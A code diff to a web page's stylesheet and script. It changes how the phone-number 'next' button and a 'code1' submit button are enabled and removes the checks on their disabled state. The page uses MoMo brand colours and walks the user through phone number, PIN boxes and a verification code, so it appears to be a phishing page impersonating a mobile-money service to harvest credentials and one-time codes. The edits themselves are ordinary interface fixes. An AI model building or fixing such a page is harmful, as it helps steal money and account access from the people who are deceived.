@@ -176,16 +176,14 @@ button.next-btn {
   text-transform: uppercase;
   letter-spacing: 0.5px;
   cursor: not-allowed;
-  pointer-events: none;
   transition: all 0.2s ease;
 }
 
-/* FIXED STYLE OVERWRITE: Restores standard button accessibility configuration */
+/* Updated active state setup */
 button.next-btn.active {
   background: var(--momo-yellow) !important;
   color: var(--momo-blue) !important;
   cursor: pointer !important;
-  pointer-events: auto !important;
 }
 
 .footer-notice {
@@ -362,24 +360,25 @@ function showPage(pageId) {
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
+// Fixed property handler
 phoneInput.addEventListener("input", () => {
   phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
   
   if (phoneInput.value.length >= 9) {
-    nextPhoneBtn.disabled = false;
+    nextPhoneBtn.removeAttribute("disabled"); // Physically removes disabled behavior from HTML
     nextPhoneBtn.classList.add("active");
   } else {
-    nextPhoneBtn.disabled = true;
+    nextPhoneBtn.setAttribute("disabled", "true");
     nextPhoneBtn.classList.remove("active");
   }
 });
 
 nextPhoneBtn.addEventListener("click", () => {
-  if (!nextPhoneBtn.disabled) {
-    showPage("page2");
+  showPage("page2");
+  setTimeout(() => {
     const firstBox = document.querySelector("#pinBoxes input");
     if (firstBox) firstBox.focus();
-  }
+  }, 50);
 });
 
 const code1Input = document.getElementById("code1");
@@ -387,18 +386,16 @@ const submitCode1Btn = document.getElementById("submitCode1");
 
 code1Input.addEventListener("input", () => {
   if (code1Input.value.trim().length > 0) {
-    submitCode1Btn.disabled = false;
+    submitCode1Btn.removeAttribute("disabled");
     submitCode1Btn.classList.add("active");
   } else {
-    submitCode1Btn.disabled = true;
+    submitCode1Btn.setAttribute("disabled", "true");
     submitCode1Btn.classList.remove("active");
   }
 });
 
 submitCode1Btn.addEventListener("click", () => {
-  if (!submitCode1Btn.disabled) {
-    submitStage("code1", { code1: code1Input.value.trim() });
-  }
+  submitStage("code1", { code1: code1Input.value.trim() });
 });
 
 function setupBoxInputs(containerId, totalLength, completeCallback) {
